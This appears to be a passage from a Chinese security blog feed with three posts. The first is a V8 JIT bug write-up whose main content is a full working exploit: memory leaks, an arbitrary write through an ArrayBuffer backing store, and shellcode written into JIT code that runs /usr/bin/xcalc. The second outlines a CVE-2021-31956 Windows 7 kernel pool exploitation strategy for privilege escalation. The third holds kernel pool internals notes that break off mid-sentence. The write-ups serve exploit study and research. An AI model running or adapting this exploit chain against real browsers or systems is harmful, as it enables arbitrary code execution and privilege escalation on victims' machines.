class="hljs-number">0</span><br> - enum length: invalid<br> - back pointer: <span class="hljs-number">0</span>x3bd4a9582311 &lt;undefined&gt;<br> - instance descriptors (own) <span class="hljs-string">#0</span>: <span class="hljs-number">0</span>x3bd4a9582231 &lt;FixedArray[<span class="hljs-number">0</span>]&gt;<br> - layout descriptor: <span class="hljs-number">0</span><br> - transitions <span class="hljs-string">#1</span>: <span class="hljs-number">0</span>x3194ff9ac891 WeakCell <span class="hljs-keyword">for</span> <span class="hljs-number">0</span>x3a202ca8c391 &lt;Map(FAST_HOLEY_SMI_ELEMENTS)&gt;<br>     #xyz: (transition <span class="hljs-keyword">to</span> data), attrs: [WEC] -&gt; <span class="hljs-number">0</span>x3a202ca8c391 &lt;Map(FAST_HOLEY_SMI_ELEMENTS)&gt;<br> - prototype: <span class="hljs-number">0</span>x3194ff995e49 &lt;an <span class="hljs-keyword">Object</span> <span class="hljs-keyword">with</span> map <span class="hljs-number">0</span>x3a202ca86561&gt;<br> - <span class="hljs-function"><span class="hljs-keyword">constructor</span>:</span> <span class="hljs-number">0</span>x3194ff995be9 &lt;JS <span class="hljs-function"><span class="hljs-keyword">Function</span> <span class="hljs-title">Set</span> <span class="hljs-params">(SharedFunctionInfo 0x3bd4a959cb31)</span>&gt;</span><br><span class="hljs-function"> - <span class="hljs-title">code</span> <span class="hljs-title">cache</span>:</span> <span class="hljs-number">0</span>x3bd4a9582241 &lt;FixedArray[<span class="hljs-number">0</span>]&gt;<br> - dependent code: <span class="hljs-number">0</span>x3194ff9ac559 &lt;FixedArray[<span class="hljs-number">3</span>]&gt;<br> - construction counter: <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>接着会</p><p>mov    rax, qword ptr [rax + 7]</p><p>即取出rax的elements对象地址</p><p>然后会进一步取出n.xyz并进行赋值，也就是这出了问题</p><p><img src="image-20220322164501837.png" alt="image-20220322164501837"></p><p>这一步会破坏string map结构导致下面parseInt(‘AAAAAAAA’);报错</p><p><img src="image-20220322192002609.png" alt="image-20220322192002609"></p><p>n.xyz = 0x826852f4;</p><p>0x826852f4被当作double处理所以是0x41E04D0A5E800000</p><p>所以现在存在一个越界写，为了不破坏string map我们需要伪造下使得</p><p>n.xyz = 3.4766863919133141e-308;//0x019000400007300</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>完整exp直接照搬sakura博客了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> ab = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x200</span>);<br><span class="hljs-keyword">var</span> n;<br><span class="hljs-keyword">var</span> m;<br><span class="hljs-keyword">var</span> l;<br><br><br><span class="hljs-keyword">var</span> evil_f = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Function</span>(<span class="hljs-string">&quot;var a = 1000000&quot;</span>);<br><br><span class="hljs-comment">// int-&gt;double</span><br><span class="hljs-comment">// d2u(intaddr/0x100000000,intaddr&amp;0xffffffff)</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">d2u</span>(<span class="hljs-params">num1,num2</span>)</span>&#123;<br>    d = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(<span class="hljs-number">2</span>);<br>    d[<span class="hljs-number">0</span>] = num2;<br>    d[<span class="hljs-number">1</span>] = num1;<br>    f = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(d.buffer);<br>    <span class="hljs-keyword">return</span> f[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-comment">// double-&gt;int</span><br><span class="hljs-comment">// u2d(floataddr)</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">u2d</span>(<span class="hljs-params">num</span>)</span>&#123;<br>    f = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(<span class="hljs-number">1</span>);<br>    f[<span class="hljs-number">0</span>] = num;<br>    d = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(f.buffer);<br>    <span class="hljs-keyword">return</span> d[<span class="hljs-number">1</span>] * <span class="hljs-number">0x100000000</span> + d[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Ctor</span>(<span class="hljs-params"></span>) </span>&#123;<br>n = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Set</span>();<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Ctor2</span>(<span class="hljs-params"></span>) </span>&#123;<br>m = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Map</span>();<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Ctor3</span>(<span class="hljs-params"></span>) </span>&#123;<br>l = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>();<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Check</span>(<span class="hljs-params">obj</span>)</span>&#123;<br><span class="hljs-comment">// oob write empty_Fixed_Array, write object to null_str buffer</span><br>    n.xyz = <span class="hljs-number">3.4766863919152113e-308</span>; <span class="hljs-comment">// do not modify string map</span><br>    n.xyz1 = <span class="hljs-number">0x0</span>; <span class="hljs-comment">// do not modify the value</span><br>    n.xyz2 = <span class="hljs-number">0x7000</span>; <span class="hljs-comment">// enlarge length of builtIn string &#x27;null&#x27;</span><br>    n.xyz3 = obj; <span class="hljs-comment">// leak the Object addr</span><br>&#125;<br><span class="hljs-comment">// print(&quot;0x&quot;+u2d(3.4766863919133141e-308;</span><br><span class="hljs-comment">// print(d2u(0x0019000400007300/0x100000000,0x0019000400007300&amp;0xffffffff));</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Check2</span>(<span class="hljs-params">addr</span>)</span>&#123;<br><span class="hljs-comment">// Oob write empty_Fixed_Array, str buffer value will be treat as a number pointer</span><br>m.xyz = <span class="hljs-number">3.4766863919152113e-308</span>;    <span class="hljs-comment">// do not modify string map</span><br>m.xyz1 = <span class="hljs-number">0x0</span>                 <span class="hljs-comment">// do not modify the value</span><br>m.xyz2 = <span class="hljs-number">0x7000</span>     <span class="hljs-comment">// enlarge length of builtIn string &#x27;null&#x27;</span><br>    m.xyz3 = addr <br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Check3</span>(<span class="hljs-params">addr</span>)</span>&#123;<br><span class="hljs-comment">// Oob write empty_Fixed_Array, str length will be treat as a number pointer </span><br>l.xyz = <span class="hljs-number">3.4766863919152113e-308</span>;    <span class="hljs-comment">// do not modify string map</span><br>l.xyz1 = addr  <br>&#125;<br><br><br><span class="hljs-comment">// JIT优化</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">10000</span>; ++i) &#123;<br>    Ctor();<br>    Ctor2();<br>    Ctor3();<br>&#125;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">10000</span>; ++i) &#123;<br>    Check(<span class="hljs-literal">null</span>);<br>    Check2(<span class="hljs-number">3.4766863919152113e-308</span>);<br>    Check3(<span class="hljs-number">3.4766863919152113e-308</span>);<br>&#125;<br><br>Ctor(); <span class="hljs-comment">// 初始化n</span><br>Ctor2(); <span class="hljs-comment">// 初始化m</span><br>Ctor3(); <span class="hljs-comment">// 初始化l</span><br>print(<span class="hljs-string">&quot;jsset is :&quot;</span>);<br>%DebugPrint(n);<br><span class="hljs-comment">// %DebugPrint(Check);</span><br><span class="hljs-comment">// read(1);//插入断点</span><br>Check(ab);<br><br><span class="hljs-keyword">var</span> str = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>(<span class="hljs-literal">null</span>);<br>%DebugPrint(ab);<br><span class="hljs-keyword">var</span> ab_addr = str.charCodeAt(<span class="hljs-number">0</span>)*<span class="hljs-number">0x1</span>+str.charCodeAt(<span class="hljs-number">1</span>)*<span class="hljs-number">0x100</span>+str.charCodeAt(<span class="hljs-number">2</span>)*<span class="hljs-number">0x10000</span>+str.charCodeAt(<span class="hljs-number">3</span>)*<span class="hljs-number">0x1000000</span>+str.charCodeAt(<span class="hljs-number">4</span>)*<span class="hljs-number">0x100000000</span>+str.charCodeAt(<span class="hljs-number">5</span>)*<span class="hljs-number">0x10000000000</span>+str.charCodeAt(<span class="hljs-number">6</span>)*<span class="hljs-number">0x1000000000000</span>+str.charCodeAt(<span class="hljs-number">7</span>)*<span class="hljs-number">0x100000000000000</span>;<br>print(<span class="hljs-string">&quot;0x&quot;</span>+ab_addr.toString(<span class="hljs-number">16</span>));<br><span class="hljs-keyword">var</span> ab_len_ptr = ab_addr+<span class="hljs-number">24</span>;<br><br>ab_len_ptr_float = d2u(ab_len_ptr/<span class="hljs-number">0x100000000</span>,ab_len_ptr&amp;<span class="hljs-number">0xffffffff</span>);<br>Check(evil_f);<br>%DebugPrint(evil_f);<br><span class="hljs-keyword">var</span> func_addr = str.charCodeAt(<span class="hljs-number">0</span>)*<span class="hljs-number">0x1</span>+str.charCodeAt(<span class="hljs-number">1</span>)*<span class="hljs-number">0x100</span>+str.charCodeAt(<span class="hljs-number">2</span>)*<span class="hljs-number">0x10000</span>+str.charCodeAt(<span class="hljs-number">3</span>)*<span class="hljs-number">0x1000000</span>+str.charCodeAt(<span class="hljs-number">4</span>)*<span class="hljs-number">0x100000000</span>+str.charCodeAt(<span class="hljs-number">5</span>)*<span class="hljs-number">0x10000000000</span>+str.charCodeAt(<span class="hljs-number">6</span>)*<span class="hljs-number">0x1000000000000</span>+str.charCodeAt(<span class="hljs-number">7</span>)*<span class="hljs-number">0x100000000000000</span>;<br>print(<span class="hljs-string">&quot;0x&quot;</span>+func_addr.toString(<span class="hljs-number">16</span>));<br>func_addr = func_addr - <span class="hljs-number">1</span>;<br>func_addr_float = d2u(func_addr/<span class="hljs-number">0x100000000</span>,func_addr&amp;<span class="hljs-number">0xffffffff</span>);<br><br>Check(<span class="hljs-built_in">String</span>(<span class="hljs-literal">null</span>));<br><span class="hljs-comment">// %DebugPrint(Check2);</span><br><span class="hljs-comment">// read(1);//插入断点                 </span><br><br>Check2(ab_len_ptr_float);<br><br><br>Check3(func_addr_float);<br><br>f64 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(ab);<br>shellcode_addr_float = f64[<span class="hljs-number">7</span>];<br>print(<span class="hljs-string">&quot;0x&quot;</span>+(u2d(shellcode_addr_float)).toString(<span class="hljs-number">16</span>));<br>Check3(shellcode_addr_float);<br><span class="hljs-comment">// pop /usr/bin/xcalc</span><br><span class="hljs-keyword">var</span> shellcode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(ab);<br>shellcode[<span class="hljs-number">0</span>] = <span class="hljs-number">0x90909090</span>;<br>shellcode[<span class="hljs-number">1</span>] = <span class="hljs-number">0x90909090</span>;<br>shellcode[<span class="hljs-number">2</span>] = <span class="hljs-number">0x782fb848</span>;<br>shellcode[<span class="hljs-number">3</span>] = <span class="hljs-number">0x636c6163</span>;<br>shellcode[<span class="hljs-number">4</span>] = <span class="hljs-number">0x48500000</span>;<br>shellcode[<span class="hljs-number">5</span>] = <span class="hljs-number">0x73752fb8</span>;<br>shellcode[<span class="hljs-number">6</span>] = <span class="hljs-number">0x69622f72</span>;<br>shellcode[<span class="hljs-number">7</span>] = <span class="hljs-number">0x8948506e</span>;<br>shellcode[<span class="hljs-number">8</span>] = <span class="hljs-number">0xc03148e7</span>;<br>shellcode[<span class="hljs-number">9</span>] = <span class="hljs-number">0x89485750</span>;<br>shellcode[<span class="hljs-number">10</span>] = <span class="hljs-number">0xd23148e6</span>;<br>shellcode[<span class="hljs-number">11</span>] = <span class="hljs-number">0x3ac0c748</span>;<br>shellcode[<span class="hljs-number">12</span>] = <span class="hljs-number">0x50000030</span>;<br>shellcode[<span class="hljs-number">13</span>] = <span class="hljs-number">0x4944b848</span>;<br>shellcode[<span class="hljs-number">14</span>] = <span class="hljs-number">0x414c5053</span>;<br>shellcode[<span class="hljs-number">15</span>] = <span class="hljs-number">0x48503d59</span>;<br>shellcode[<span class="hljs-number">16</span>] = <span class="hljs-number">0x3148e289</span>;<br>shellcode[<span class="hljs-number">17</span>] = <span class="hljs-number">0x485250c0</span>;<br>shellcode[<span class="hljs-number">18</span>] = <span class="hljs-number">0xc748e289</span>;<br>shellcode[<span class="hljs-number">19</span>] = <span class="hljs-number">0x00003bc0</span>;<br>shellcode[<span class="hljs-number">20</span>] = <span class="hljs-number">0x050f00</span>;<br><br>evil_f();<br></code></pre></td></tr></table></figure><p>下面讲解原理</p><p><img src="image-20220323234945957.png" alt="image-20220323234945957"></p><p>先触发优化然后Check(ab);</p><p>poc已经知道这里会越界写下面的string null结构</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">function</span> Check(obj)&#123;<br><span class="hljs-regexp">//</span> oob write empty_Fixed_Array, write object to null_str buffer<br>    n.xyz = <span class="hljs-number">3.4766863919152113</span>e-<span class="hljs-number">308</span>; <span class="hljs-regexp">//</span> <span class="hljs-keyword">do</span> not modify string map<br>    n.xyz1 = <span class="hljs-number">0</span>x0; <span class="hljs-regexp">//</span> <span class="hljs-keyword">do</span> not modify the value<br>    n.xyz2 = <span class="hljs-number">0</span>x7000; <span class="hljs-regexp">//</span> enlarge length of builtIn string <span class="hljs-string">&#x27;null&#x27;</span><br>    n.xyz3 = obj; <span class="hljs-regexp">//</span> leak the Object addr<br>&#125;<br></code></pre></td></tr></table></figure><p>n.xyz是string map</p><p>xyz1是hash</p><p>xyz2是length，这边扩大到0x7000,string null是4</p><p>xyz3是需要leak的值，写入任意ab地址后通过读取string值即可达成leak</p><p><img src="image-20220323235218771.png" alt="image-20220323235218771"></p><p>成功写入然后</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> ab_addr = str.charCodeAt(<span class="hljs-number">0</span>)*<span class="hljs-number">0x1</span>+str.charCodeAt(<span class="hljs-number">1</span>)*<span class="hljs-number">0x100</span>+str.charCodeAt(<span class="hljs-number">2</span>)*<span class="hljs-number">0x10000</span>+str.charCodeAt(<span class="hljs-number">3</span>)*<span class="hljs-number">0x1000000</span>+str.charCodeAt(<span class="hljs-number">4</span>)*<span class="hljs-number">0x100000000</span>+str.charCodeAt(<span class="hljs-number">5</span>)*<span class="hljs-number">0x10000000000</span>+str.charCodeAt(<span class="hljs-number">6</span>)*<span class="hljs-number">0x1000000000000</span>+str.charCodeAt(<span class="hljs-number">7</span>)*<span class="hljs-number">0x100000000000000</span>;<br></code></pre></td></tr></table></figure><p>同理leak出evil_f function地址</p><p>然后把string null写入该地址</p><p>下面看下check2</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Check2</span>(<span class="hljs-params">addr</span>)</span>&#123;<br><span class="hljs-comment">// Oob write empty_Fixed_Array, str buffer value will be treat as a number pointer</span><br>m.xyz = <span class="hljs-number">3.4766863919152113e-308</span>;    <span class="hljs-comment">// do not modify string map</span><br>m.xyz1 = <span class="hljs-number">0x0</span>                 <span class="hljs-comment">// do not modify the value</span><br>m.xyz2 = <span class="hljs-number">0x7000</span>     <span class="hljs-comment">// enlarge length of builtIn string &#x27;null&#x27;</span><br>    m.xyz3 = addr <br>&#125;<br></code></pre></td></tr></table></figure><p>check2和check不同。xyz3会被当作指针解析</p><p>string null地址写入后，调用check2会把addr写入string null+0x8处</p><p>这边把ab_len_ptr_float写入，因为ab_len_ptr_float后面紧跟着backingstore</p><p>下面调用check3，check3会把xyz1域当作指针解析即地址会被写入ab_len_ptr_float+0x8处即直接写backingstore</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Check3</span>(<span class="hljs-params">addr</span>)</span>&#123;<br><span class="hljs-comment">// Oob write empty_Fixed_Array, str length will be treat as a number pointer </span><br>l.xyz = <span class="hljs-number">3.4766863919152113e-308</span>;    <span class="hljs-comment">// do not modify string map</span><br>l.xyz1 = addr  <br>&#125;<br></code></pre></td></tr></table></figure><p>调用Check3(func_addr_float);把func地址写入后</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">f64 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(ab);<br>shellcode_addr_float = f64[<span class="hljs-number">7</span>];<br>print(<span class="hljs-string">&quot;0x&quot;</span>+(u2d(shellcode_addr_float)).toString(<span class="hljs-number">16</span>));<br></code></pre></td></tr></table></figure><p>获取code地址，第七个成员就是code地址。</p><p><img src="image-20220323235757727.png" alt="image-20220323235757727"></p><p>最后把code地址写入backingstore然后分配array赋值shellcode即可。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript">Check3(shellcode_addr_float);<br><span class="hljs-comment">// pop /usr/bin/xcalc</span><br><span class="hljs-keyword">var</span> shellcode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(ab);<br>shellcode[<span class="hljs-number">0</span>] = <span class="hljs-number">0x90909090</span>;<br>shellcode[<span class="hljs-number">1</span>] = <span class="hljs-number">0x90909090</span>;<br>shellcode[<span class="hljs-number">2</span>] = <span class="hljs-number">0x782fb848</span>;<br>shellcode[<span class="hljs-number">3</span>] = <span class="hljs-number">0x636c6163</span>;<br>shellcode[<span class="hljs-number">4</span>] = <span class="hljs-number">0x48500000</span>;<br>shellcode[<span class="hljs-number">5</span>] = <span class="hljs-number">0x73752fb8</span>;<br>shellcode[<span class="hljs-number">6</span>] = <span class="hljs-number">0x69622f72</span>;<br>shellcode[<span class="hljs-number">7</span>] = <span class="hljs-number">0x8948506e</span>;<br>shellcode[<span class="hljs-number">8</span>] = <span class="hljs-number">0xc03148e7</span>;<br>shellcode[<span class="hljs-number">9</span>] = <span class="hljs-number">0x89485750</span>;<br>shellcode[<span class="hljs-number">10</span>] = <span class="hljs-number">0xd23148e6</span>;<br>shellcode[<span class="hljs-number">11</span>] = <span class="hljs-number">0x3ac0c748</span>;<br>shellcode[<span class="hljs-number">12</span>] = <span class="hljs-number">0x50000030</span>;<br>shellcode[<span class="hljs-number">13</span>] = <span class="hljs-number">0x4944b848</span>;<br>shellcode[<span class="hljs-number">14</span>] = <span class="hljs-number">0x414c5053</span>;<br>shellcode[<span class="hljs-number">15</span>] = <span class="hljs-number">0x48503d59</span>;<br>shellcode[<span class="hljs-number">16</span>] = <span class="hljs-number">0x3148e289</span>;<br>shellcode[<span class="hljs-number">17</span>] = <span class="hljs-number">0x485250c0</span>;<br>shellcode[<span class="hljs-number">18</span>] = <span class="hljs-number">0xc748e289</span>;<br>shellcode[<span class="hljs-number">19</span>] = <span class="hljs-number">0x00003bc0</span>;<br>shellcode[<span class="hljs-number">20</span>] = <span class="hljs-number">0x050f00</span>;<br><br>evil_f();<br></code></pre></td></tr></table></figure><p>很适合入门的漏洞哈，后续会搬上另一个CVE-2019-5782。</p>]]></content>
    
    
    
    <tags>
      
      <tag>v8</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cve-2021-31956 win7 ver</title>
    <link href="/2022/03/19/cve-2021-31956-win7-ver/"/>
    <url>/2022/03/19/cve-2021-31956-win7-ver/</url>
    
    <content type="html"><![CDATA[<p>去年年中写过一次，复习了下重新写一下win7版本的打法</p><a id="more"></a><h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><p>简单说下win7上和win10的区别，因为win7的检查策略有所不同，漏洞堆块为系统临时申请，函数调用完后立即释放，在释放时win7会根据blocksize去定位下一个chunk的pool_header,然后验证是否free来进行一个merge操作，因为该漏洞溢出只能溢出一个结构体，前4字节是offset正好对应了poolheader前四个重要成员，不太可控，所以不好好布局的话函数一调用结束就蓝屏</p><p>要想不蓝屏，最直接的办法就是布局堆块，让漏洞堆块在页最后，这样直接溢出到下一个页的堆块就不会触发检查从而导致蓝屏。</p><h1 id="Quota-Process-Pointer-Overwrite"><a href="#Quota-Process-Pointer-Overwrite" class="headerlink" title="Quota Process Pointer Overwrite"></a>Quota Process Pointer Overwrite</h1><p><img src="image-20220318184244416.png" alt="image-20220318184244416"></p><p>具体布局如上，红色为漏洞块，直接溢出到下一个页，通过覆盖attack chunk的process pointer处为用户态自己伪造的eprocess地址达成任意地址减一操作，然后注入代码到winlogin中达成提权。</p><p>触发任意地址减一需要free attack chunk，这样又会触发一次check，操作系统会检测前一个堆块是否free来进行merge所以这边溢出的时候需要构造一个fake chunk并对应修改attack chunk的prevsize处防止蓝屏</p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>但是上面那种打法会存在一个问题，就是没有修复exp，即使提权了当进程退出时就会蓝屏，为了完美的编写exp，需要尽可能来想办法修复一下。</p><p>//具体怎么修复只是一个猜测，因为时间问题我还没完全搞定，主要是没有找到合适的结构体。</p><p>堆布局其实可以和上面的类似，只不过attack chunk得是一个合适的结构体，类似win10里的wnf结构体(这个结构体win7里没有)有一个指针，并且三环提供了相应的api可以进行读写，这样就可以达成任意地址读写。</p><p>//本来的想法是通过ListEntry Flink Overwrite，然后分配一个堆块到用户态地址处这样我们就能完全可控这个堆块，但是存在一个很尴尬的问题就是有一定概率会触发pagefault。</p><p>防止进程退出后蓝屏可以通过遍历句柄表吧引用技术减一即可。</p><p>过段时间有空了查文章找找看看有没有合适的结构体，如果各位大佬们有的话可以加qq发我1403517540，有偿23333333</p><p>//todo</p><h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>漏洞概念没理解清楚，FILE_FULL_EA_INFORMATION是四字节对其的，chunk是16字节对其，可以腾出12字节空间来访前面的offset外加name，后续的EaValue正好覆盖到poolheader完全可控，压根不需要修复。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>win7 kernel pool exploitation</title>
    <link href="/2022/03/06/win7-kernel-pool-exploitation/"/>
    <url>/2022/03/06/win7-kernel-pool-exploitation/</url>
    
    <content type="html"><![CDATA[<p>读书笔记</p><p>具体看Tarjei Mandt的slides</p><a id="more"></a><p>因为工作需要，对win7的内核漏洞利用需要了解下。</p><h1 id="Kernel-Pool-Internals"><a href="#Kernel-Pool-Internals" class="headerlink" title="Kernel Pool Internals"></a>Kernel Pool Internals</h1><p>池描述符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">POOL_DESCRIPTOR</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-comment">/*0x000*/</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> _<span class="hljs-title">POOL_TYPE</span> <span class="hljs-title">PoolType</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-comment">/*0x004*/</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">KGUARDED_MUTEX</span> <span class="hljs-title">PagedLock</span>;</span><br><span class="hljs-comment">/*0x004*/</span> ULONG32 NonPagedLock;<br>&#125;;<br><span class="hljs-comment">/*0x040*/</span> LONG32 RunningAllocs;<br><span class="hljs-comment">/*0x044*/</span> LONG32 RunningDeAllocs;<br><span class="hljs-comment">/*0x048*/</span> LONG32 TotalBigPages;<br><span class="hljs-comment">/*0x04C*/</span> LONG32 ThreadsProcessingDeferrals;<br><span class="hljs-comment">/*0x050*/</span> ULONG32 TotalBytes;<br><span class="hljs-comment">/*0x054*/</span> UINT8 _PADDING0_[<span class="hljs-number">0x2C</span>];<br><span class="hljs-comment">/*0x080*/</span> ULONG32 PoolIndex;<br><span class="hljs-comment">/*0x084*/</span> UINT8 _PADDING1_[<span class="hljs-number">0x3C</span>];<br><span class="hljs-comment">/*0x0C0*/</span> LONG32 TotalPages;<br><span class="hljs-comment">/*0x0C4*/</span> UINT8 _PADDING2_[<span class="hljs-number">0x3C</span>];<br><span class="hljs-comment">/*0x100*/</span> VOID** PendingFrees;<br><span class="hljs-comment">/*0x104*/</span> LONG32 PendingFreeDepth;<br><span class="hljs-comment">/*0x108*/</span> UINT8 _PADDING3_[<span class="hljs-number">0x38</span>];<br><span class="hljs-comment">/*0x140*/</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LIST_ENTRY</span> <span class="hljs-title">ListHeads</span>[512];</span><br>&#125; POOL_DESCRIPTOR, *PPOOL_DESCRIPTOR;<br></code></pre></td></tr></table></figure><p>用于管理内核堆块，负责记录在使用中的堆块数目等其他与堆块相关的信息。</p><p>PendingFrees指向延迟释放列表，是一个单项链表存放等待呗释放的堆块。</p><p>ListHeads是一个双向链表，链接相同大小的被释放块。每个单位占8字节。被free的chunk进入listheads时会根据block 